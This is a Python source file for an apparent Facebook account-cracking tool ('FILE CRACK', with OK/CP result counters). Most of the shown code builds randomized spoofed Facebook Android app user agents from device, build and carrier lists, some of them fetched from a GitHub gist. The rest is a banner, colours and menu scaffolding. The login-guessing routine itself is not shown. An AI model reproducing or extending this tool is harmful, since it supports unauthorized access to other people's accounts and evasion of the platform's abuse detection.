#─━─━─━─━import─━─━─━─━─#
" script owner Md Salam  "
import os,zlib
from os import system as osRUB
from os import system as cmd
from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as YousuFYousuF
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit
#─━─━─━─━Find User Agent─━──━─━#
import random
from typing import Optional, List, Tuple

def super_working_fb_ua_2026(seed: Optional[int] = None) -> str:
    if seed is not None:
        random.seed(seed)

    # Facebook core
    FBAN = "FB4A"
    FBPN = "com.facebook.katana"

    FBAV = f"{random.randint(525,545)}.0.0.{random.randint(10,200)}.{random.randint(10,500)}"
    FBBV = str(random.randint(60000000,99999999))
    FBSV = random.choice(["11","12","13","14","15"])

    # Android build
    BUILD = random.choice([
        "UP1A.231105.003",
        "TP1A.240205.002",
        "TQ3A.240805.001",
        "UQ1A.250101.002",
        "UQ1A.250301.001",
        "TQ1A.240101.001"
    ])

    # Display
    density,width,height = random.choice([
        ("2.0","720","1600"),
        ("2.5","1080","2400"),
        ("2.75","1220","2600"),
        ("3.0","1200","2800"),
        ("3.25","1440","3120")
    ])

    # Locale + Carrier
    FBLC = random.choice(["en_US","bn_BD","en_GB","en_IN"])
    FBCR = random.choice(["Grameenphone","Robi","Banglalink","Airtel","Jio","Vodafone"])

    # CPU
    FBCA = random.choice(["arm64-v8a","armeabi-v7a"])

    # Devices
    DEVICES: List[Tuple[str,str]] = [

        # Samsung
        ("Samsung","Galaxy A03s"),
        ("Samsung","Galaxy A14"),
        ("Samsung","Galaxy A15 5G"),
        ("Samsung","Galaxy A25 5G"),
        ("Samsung","Galaxy A34 5G"),
        ("Samsung","Galaxy A54 5G"),
        ("Samsung","Galaxy A55 5G"),
        ("Samsung","Galaxy S21 FE"),
        ("Samsung","Galaxy S22 Ultra"),
        ("Samsung","Galaxy S23"),
        ("Samsung","Galaxy S24 Ultra"),

        # Xiaomi / Redmi
        ("Xiaomi","Redmi 12"),
        ("Xiaomi","Redmi 13C"),
        ("Xiaomi","Redmi Note 12"),
        ("Xiaomi","Redmi Note 13"),
        ("Xiaomi","Redmi Note 13 Pro"),
        ("Xiaomi","Redmi Note 14 Pro"),
        ("Poco","Poco X5 Pro"),
        ("Poco","Poco X6 Pro"),
        ("Poco","Poco F5"),
        ("Poco","Poco F6"),

        # Realme
        ("Realme","Realme 11 Pro"),
        ("Realme","Realme 12 Pro"),
        ("Realme","Realme 13 Pro"),
        ("Realme","Narzo 60"),
        ("Realme","Narzo 70 5G"),
        ("Realme","GT 6"),

        # Oppo
        ("Oppo","Reno 10"),
        ("Oppo","Reno 11"),
        ("Oppo","Reno 12"),
        ("Oppo","Find X6"),

        # Vivo
        ("Vivo","Vivo Y27"),
        ("Vivo","Vivo Y36"),
        ("Vivo","Vivo V29"),
        ("Vivo","Vivo V30 Pro"),
        ("Vivo","Vivo X90 Pro"),

        # Tecno
        ("Tecno","Camon 30"),
        ("Tecno","Camon 30 Pro"),
        ("Tecno","Spark 20"),
        ("Tecno","Spark 20 Pro"),
        ("Tecno","Pova 6 Pro"),

        # Infinix
        ("Infinix","Note 30"),
        ("Infinix","Note 40"),
        ("Infinix","GT 20 Pro"),
        ("Infinix","Zero 30"),

        # Google
        ("Google","Pixel 7"),
        ("Google","Pixel 8"),
        ("Google","Pixel 8 Pro"),

        # OnePlus
        ("OnePlus","Nord 3"),
        ("OnePlus","Nord CE3"),
        ("OnePlus","OnePlus 11"),
        ("OnePlus","OnePlus 12"),

        # Others
        ("Motorola","Edge 40"),
        ("Sony","Xperia 1 V"),
        ("Nokia","G22"),
        ("ASUS","ROG Phone 7")
    ]

    # Weighted selection
    r = random.random()
    if r < 0.55:
        FBMF,FBDV = random.choice([d for d in DEVICES if d[0] == "Samsung"])
    elif r < 0.75:
        FBMF,FBDV = random.choice([d for d in DEVICES if d[0] in ("Xiaomi","Poco")])
    elif r < 0.90:
        FBMF,FBDV = random.choice([d for d in DEVICES if d[0] in ("Realme","Oppo","Vivo")])
    else:
        FBMF,FBDV = random.choice(DEVICES)

    FBBD = FBMF

    ua = (
        f"Dalvik/2.1.0 (Linux; U; Android {FBSV}; {FBDV} Build/{BUILD}) "
        f"[FBAN/{FBAN};FBAV/{FBAV};FBBV/{FBBV};"
        f"FBDM/{{density={density},width={width},height={height}}};"
        f"FBLC/{FBLC};FBCR/{FBCR};FBMF/{FBMF};FBBD/{FBBD};"
        f"FBPN/{FBPN};FBDV/{FBDV};FBSV/{FBSV};FBOP/1;FBCA/{FBCA};]"
    )

    return ua

#─━─━─━─━[User Agent]━─━─━─━─━#
# M2
def yousuffile():
    END = 'Davik/2.1.0 (Linux; U; Android 11.0.0; Galaxy J7 Prime Build/RQ3A.210705.001) [FBAN/FB4A;FBAV/359.0.0.15.114;FBBV/25281137;FBDM/{density=2.0,width=1080,height=1920};FBLC/en_GB;FBCR/Robi;FBMF/Samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G610F;FBSV/11;FBOP/20;FBCA/arm64-v8a:;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; Galaxy J7 Prime Build/RQ3A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
def yousuffile1():
    END = '[FBAN/FB4A;FBAV/166.0.0.4.121;FBBV/66448084;FBDM/{density=2.5,width=1280,height=1920};FBLC/en_US;FBCR/Airtel;FBMF/Motorola;FBBD/Motorola;FBPN/com.facebook.katana;FBDV/Moto G Power (2022);FBSV/10.3.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 12; Armor X10 Pro Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 10; LT600T Build/QKQ1.200216.002)","Dalvik/2.1.0 (Linux; U; Android 13; SHG07 Build/S116H)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/T3B2.230316.003)","Dalvik/2.1.0 (Linux; U; Android 5.1; Ixion ES350 Build/DEXP)","Dalvik/2.1.0 (Linux; U; Android 12; ELZ-AN20 Build/HONORELZ-AN20)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 20 pro Build/T1RA33.55-15-10)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; ASUS_Z012DA Build/MMB29P)","Dalvik/2.1.0 (Linux; U; Android 11; BQru-6868L Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 12; TAB_912_PRO_4G Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; 22031116AI Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 10; O2 TV Box Build/QTT2.200720.001)","Dalvik/2.1.0 (Linux; U; Android 9; motorola one vision Build/PSA29.97-37)","Dalvik/2.1.0 (Linux; U; Android 9; AFTANNA0 Build/PMAIN1.2992N)","Dalvik/2.1.0 (Linux; U; Android 13; M2101K6P Build/TKQ1.221013.002)","Dalvik/2.1.0 (Linux; U; Android 13; V2127 Build/TP1A.220624.014_NONFC)","Dalvik/2.1.0 (Linux; U; Android 11; octopus Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 13; 23021RAAEG Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 13; SM-G950F Build/TQ2A.230405.003.E1)","Dalvik/2.1.0 (Linux; U; Android 12; 100071485 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; SM-A505N Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 10.0; YT7260L Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Gtel X7plus Build/O11019)","Dalvik/1.6.0 (Linux; U; Android 4.4.4; TPS550A Build/KTU84Q)","Dalvik/2.1.0 (Linux; U; Android 10; TC57 Build/10-16-10.00-QG-U133-STD-HEL-04)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2271 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; iris60c Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; GT-S7580 Build/LMY48Y)","Dalvik/2.1.0 (Linux; U; Android 7.0; SPYBOXSXMINI Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 11; K55g Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 12; V2065 Build/SP1A.210812.003)","Dalvik/2.1.0 (Linux; U; Android 11; E506 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 11; BNE-LX3 Build/HUAWEIBNE-LX3)","Dalvik/2.1.0 (Linux; U; Android 9; APEXA-A-1500 Build/PI)","Dalvik/2.1.0 (Linux; U; Android 9; DL3Plus Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 11; E7110 Build/4.501VZ.0568.a)","Dalvik/2.1.0 (Linux; U; Android 9; VISIO TV Build/PTO7.210711.001)","Dalvik/2.1.0 (Linux; U; Android 9.0; PHILCO_ATV11 Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 13; Redmi Note 8 Build/TQ1A.230205.002)","Dalvik/2.1.0 (Linux; U; Android 12; RBN-NX1 Build/HONORRBN-N31)","Dalvik/2.1.0 (Linux; U; Android 10; motorola one action Build/QSB30.62-17-17)","Dalvik/2.1.0 (Linux; U; Android 5.1; YU 6000 Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 13; 23028RA60L Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 10; Note 7T Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 13; SM-G9880 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; T10W2 Build/RP1A.201105.002)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A346M Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; CORN X55 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; PO-10034 Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 11; 2209116AG Build/RKQ1.200826.002)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; DroidBox Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 9; moto e(6) plus Build/PTAS29.401-25-3)","Dalvik/2.1.0 (Linux; U; Android 11; Motorola Defy Build/RZD31.31)","Dalvik/2.1.0 (Linux; U; Android 10; HEYOU20 Build/QKQ1.191008.001)","Dalvik/2.1.0 (Linux; U; Android 11; U55 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; px30_evb Build/OPM8.190505.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-60-3-1)","Dalvik/2.1.0 (Linux; U; Android 12; moto g72 Build/S3SVS32.45-28-2-2)","Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-60-1)","Dalvik/2.1.0 (Linux; U; Android 12; A003SH Build/S2010)","Dalvik/2.1.0 (Linux; U; Android 9; VOG-L04 Build/HUAWEIVOG-L04)","Dalvik/2.1.0 (Linux; U; Android 10; motorola one 5G ace Build/QZKS30.Q4-40-64-14)","Dalvik/2.1.0 (Linux; U; Android 11; JAD-LX9 Build/HUAWEIJAD-L09)","Dalvik/2.1.0 (Linux; U; Android 12; V2202 Build/SP1A.210812.003_SC)","Dalvik/2.1.0 (Linux; U; Android 10.1; T99 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 11; Grundig Android UHD TV Build/RTM3.211215.227)","Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 9 Build/RQ2A.210505.003)","Dalvik/2.1.0 (Linux; U; Android 11; Black G Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 10; K6b Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 6.0; 4049G Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 7.1; GOLDTVPlus Build/NRD91N)","Dalvik/2.1.0 (Linux; U; Android 12; RKY-LX3 Build/HONORRKY-L33)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; G706 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 5.1; TIS001 Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 11; C60 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 10.0; B9212BF Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 6.0; W NEXT Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 9; Bmobile AX754 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; TIS_001 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; WS5SE Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12; RKY-LX3 Build/HONORRKY-L03)","Dalvik/2.1.0 (Linux; U; Android 12; T776O Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; SGINO6 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 13; KB2007 Build/RKQ1.211119.001)","Dalvik/2.1.0 (Linux; U; Android 11; ABR-LX9 Build/HUAWEIABR-L09)","Dalvik/2.1.0 (Linux; U; Android 11; NCO-LX3 Build/HUAWEINCO-LX3)","Dalvik/2.1.0 (Linux; U; Android 12; moto g51 5G Build/S2RYAS32.58-13-12-4)","Dalvik/2.1.0 (Linux; U; Android 13; SH-RM19s Build/S3067)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A047M Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; Black_Z Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; 22120RN86G Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; S10 Build/RP1A.201005.006)","Dalvik/2.1.0 (Linux; U; Android 11; DS502 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2365 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A135N Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; I2207 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 5.0; W55SE Build/LRX21M)","Dalvik/2.1.0 (Linux; U; Android 11; K58 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g(60) Build/S2RIS32.32-20-9-7)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; GOA Build/KOT49H)",]) +END
    return ua
    # M1
def yousuf_ua():
	gtt=random.choice(['GT-I9190','KOT49H','GT-I9192','KOT49H','GT-I9300I','KTU84P','GT-I9300','IMM76D','GT-I9300','JSS15J','GT-I9301I','KOT4','GT-I9301I','KOT49H','GT-I9500','JDQ39','GT-I9500','LRX22C','GT-N5100','JZO54K','GT-N7100','KOT49H','GT-N8000','JZO54K','GT-N8000','KOT49H','GT-P3110','JZO54K','GT-P5100','IML74K','GT-P5100','JDQ','GT-P5100','JDQ39','GT-P5100','JZO54K','GT-P5110','JDQ39','GT-P5200','KOT49H','GT-P5210','KOT49H','GT-P5220','JDQ39','GT-S7390','JZO54K','SAMSUNG','SM-A500F','SAMSUNG','SM-G532F','SAMSUNG','SM-G920F','SAMSUNG','SM-G935F','SAMSUNG','SM-J320F','SAMSUNG','SM-J510FN','SAMSUNG','SM-N920S','SAMSUNG','SM-T280','SM-A500FU','MMB29M','SM-A500F','LRX22G','SM-A500F','MMB29M','SM-A500H','MMB29M','SM-G900F','KOT49H','SM-G920F','MMB29K','SM-G920F','NRD90M','SM-G930F','NRD90M','SM-G935F','MMB29K','SM-G935F','NRD90M','SM-G950F','NRD90M','SM-J320FN','LMY47V','SM-J320F','LMY4','SM-J320F','LMY47V','SM-J320H','LMY47V','SM-J320M','LMY47V','SM-J510FN','MMB29M','SM-J510FN','NMF2','SM-J510FN','NMF26X','SM-J510FN','NMF26X;','SM-J701F','NRD90M;','SM-T111','JDQ39','SM-T230','KOT49H','SM-T231','KOT49H','SM-T235','KOT4''SM-T310','KOT49H','SM-T311','KOT4','SM-T311','KOT49H','SM-T315','JDQ39','SM-T525','KOT49H','SM-T531','KOT49H','SM-T531','LRX22G','SM-T535','LRX22G','SM-T555','LRX22G','SM-T561','KTU84P','SM-T705','LRX22G','SM-T705','LRX22G','SM-T805','LRX22G','SM*T820','NRD90M','SPH-L720','KOT49H'])
	END = 'Davik/2.1.0 (Linux; U; Android 10.4.2; SM-N920 Build/QP1A.190711.020) [FBAN/FB4A;FBAV/202.0.0.30.122;FBBV/36155261;FBDM/{density=2.0,width=720,height=1440};FBLC/en_GB;FBCR/Nepal_Telecom;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-N920;FBSV/10.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;] FBBK/1'
	ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; SM-N920 Build/QP1A.190305.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
	return ua
kkkkki = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
def findtua():
        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/168.0.0.7.62;FBBV/30519999;FBDM/{density=1.0,width=1280,height=1920};FBLC/en_US;FBCR/Airtel;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/Galaxy J4 (2018);FBSV/4.1.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
        return ua
        #M1
model2 = requests.get('https://gist.githubusercontent.com/Nox-Naved/0588acb2b77932048a251d50a973029b/raw/f6de01ac684131b5353854ee114880fb00227cee/Model60').text.splitlines()   
def m1XD():
    END = '[FBAN/FB4A;FBAV/343.0.0.27.136;FBBV/37319995;FBDM/{density=2.5,width=1280,height=1920};FBLC/en_US;FBCR/Airtel;FBMF/Motorola;FBBD/Motorola;FBPN/com.facebook.katana;FBDV/Moto g7;FBSV/11.3.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/THA33.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
    #M2
def m2XD():
    END = 'Davik/2.1.0 (Linux; U; Android 14; Pixel 7 Pro Build/UPB5.230623.007) [FBAN/FB4A;FBAV/470.0.0.39.121;FBBV/145990102;FBDM/{density=3.5,width=1440,height=3120};FBLC/en_US;FBCR/Grameenphone;FBMF/Google;FBBD/Google;FBPN/com.facebook.katana;FBDV/Pixel 7 Pro;FBSV/14;FBOP/1;FBCA/arm64-v8a;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/UPB5.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
    








#M1


def Samsung():
	fban = random.choice(["FB4A"])
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fbbv = str(random.randint(10000000, 66666666))
	density = random.choice(['1.0', '1.5', '2.0', '2.5', '3.0'])
	width = random.choice(["720", "1080", "1280"])
	height = random.choice(["720", "1080", "1280", "1440", "1920", " 2400"])
	fbcr = random.choice(['Nepal_Telecom', 'Banglalink', 'Robi', 'Grameenphone', 'Airtel'])
	fblc = random.choice(["en_US", "en_GB"])
	fbbd = 'Samsung'
	fbpn = random.choice(["com.facebook.katana"])
	fbsv = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	fbmf = 'Samsung'
	build = random.choice(['RP1A.200720.012','SP1A.210812.016','KOT49H','JZO54K','TP1A.220624.014','QP1A.190711.020'])
	fbdv = random.choice(["Samsung Galaxy M54","Samsung Galaxy M14","Samsung Galaxy F14","Samsung Galaxy F04","Samsung Galaxy A05","Samsung Galaxy A15","Samsung Galaxy S23 FE","Samsung Galaxy F54","Samsung Galaxy A24 4G","Samsung Galaxy A25","Samsung Galaxy F34","Samsung Galaxy A05s","Samsung Galaxy A35","Samsung Galaxy A15 5G","Samsung Galaxy Xcover7","Samsung Galaxy S24"])
	END = f"[FBAN/{str(fban)};FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/{str(fblc)};FBCR/{str(fbcr)};FBMF/{str(fbmf)};FBBD/{str(fbbd)};FBPN/{str(fbpn)};FBDV/{str(fbdv)};FBSV/{str(fbsv)};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
	ua = f'Davik/2.1.0 (Linux; U; Android {str(fbsv)}; {str(fbdv)} Build/'+str(build)+') '+END
	return ua 
#M2

def sex2():
	fban = random.choice(["FB4A"])
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fbbv = str(random.randint(10000000, 66666666))
	density = random.choice(['1.0', '1.5', '2.0', '2.5', '3.0'])
	width = random.choice(["720", "1080", "1280"])
	height = random.choice(["720", "1080", "1280", "1440", "1920", " 2400"])
	fbcr = random.choice(['Nepal_Telecom', 'Banglalink', 'Robi', 'Grameenphone', 'Airtel'])
	fblc = random.choice(["en_US", "en_GB"])
	fbbd = 'Realme'
	fbpn = random.choice(["com.facebook.katana"])
	fbsv = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	fbmf = 'Realme'
	build = random.choice(['SP1A.210812.016','TP1A.220905.001','RP1A.201005.001','RKQ1.211103.002','QP1A.190711.020'])
	fbdv = random.choice(["Realme C30","Realme C30s","Realme 10s","Realme 11","Realme 11 Pro","Realme V30t","Realme Narzo N55","Realme C51","Realme Narzo 60 Pro","Realme 11 4G","Realme 11X","Realme Narzo 60x","Realme V50s","MI Realme C67 5G 2","Realme C67","Realme Note 50", "Realme 12 Pro","Realme C53 (India)"])
	END = f"[FBAN/{str(fban)};FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/{str(fblc)};FBCR/{str(fbcr)};FBMF/{str(fbmf)};FBBD/{str(fbbd)};FBPN/{str(fbpn)};FBDV/{str(fbdv)};FBSV/{str(fbsv)};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
	ua = f'Davik/2.1.0 (Linux; U; Android {str(fbsv)}; {str(fbdv)} Build/'+str(build)+') '+END
	return ua 



#─━─━─━─━COLOUR SYS━─━─━─━─#
sys.stdout.write('\x1b]2; SalaM\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
Z = '\033[1;33m'
ver ='\033[92;1m7.0\033[93;1m'
#─━─━─━─━LOGO SYS─━─━─━─━─#
sys.stdout.write('\x1b]2;  SalaM \x07')
try:os.mkdir('/sdcard/SalaM')
except:pass
cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
logo = (f"""\033[92;1m 
       	    888888 888888 88  88 
      	    88__   88__   88  88 
      	    88""   88""   888888 
      	    88     888888 88  88 
\033[1;37m==============================================
\033[92;1m[\033[91;1m●\033[92;1m] OWNER       \033[91;1m●\033[92;1m \033[92;1mS \033[1;37mA \033[92;1mL \033[1;37mA \033[92;1mM
\033[92;1m[\033[91;1m●\033[92;1m] FACEBOOK    \033[91;1m●\033[92;1m Ew'r Salam
\033[92;1m[\033[91;1m●\033[92;1m] TOOLS       \033[91;1m●\033[92;1m FILE - M2
\033[92;1m[\033[91;1m●\033[92;1m] VERSION     \033[91;1m●\033[92;1m 0.4
\33[1;37m==============================================""")
def linex():
        print(f"\33[1;37m==============================================""")
def clear():
    os.system("clear")
    print(logo)    
#─━─━─━─━Looop menu─━─━─━─━─#
id = []
bl = []
ps = []
sid = []
total=[]
oks = []
cps = []
filter = []
saved = []
methods = []
totaldmp = 0
srange = 0
count = 0
loop = 0
#─━─━─━─━Aprov SYS ─━─━─━─━─#

#─━─━─━─━result SYS ─━─━─━─━─#
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print('')
        linex()
        print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m THE PROCESS HAS COMPLETED ')
        print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m TOTAL OK:\033[92;1m %s' % str(len(oks)))
        print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m TOTAL CP:\033[92;1m %s' % str(len(cps)))
        linex()
        input("\x1b[1;92m[•]\033[1;37m ━ \x1b[1;92mPRESS ENTER TO BACK  ")
        exit()
#─━─━─━─━Main menu─━─━─━─━─#
def YousuF():
            os.system('clear')
            print(logo)
            print(f'\033[92;1m[\033[1;37mA\033[92;1m] \033[1;37mFILE CRACK ')
            print(f'\033[92;1m[\033[1;37mH\033[92;1m] \033[1;37mEXIT TOOLS')
            linex()
